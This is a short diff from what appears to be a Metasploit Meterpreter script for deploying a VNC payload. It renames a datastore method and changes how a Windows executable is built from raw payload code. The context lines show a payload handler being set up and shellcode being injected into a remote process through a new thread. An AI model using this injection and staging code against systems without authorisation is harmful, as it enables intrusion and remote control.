@@ -117,7 +117,7 @@ end
 
 if autoconn
 	mul = client.framework.exploits.create("multi/handler")
-	mul.share_datastore(pay.datastore)
+	mul.share_data_store(pay.datastore)
 
 	mul.datastore['WORKSPACE'] = client.workspace
 	mul.datastore['PAYLOAD'] = payload
@@ -149,7 +149,10 @@ if (inject)
 	host_process.memory.write(mem, raw)
 	host_process.thread.create(mem, 0)
 else
-	exe = ::Msf::Util::EXE.to_win32pe(client.framework, raw)
+	exe = ::Msf::Util::EXE.to_win32pe(
+      code: raw,
+      framework: client.framework,
+  )
 	print_status("VNC stager executable #{exe.length} bytes long")
 
 	#
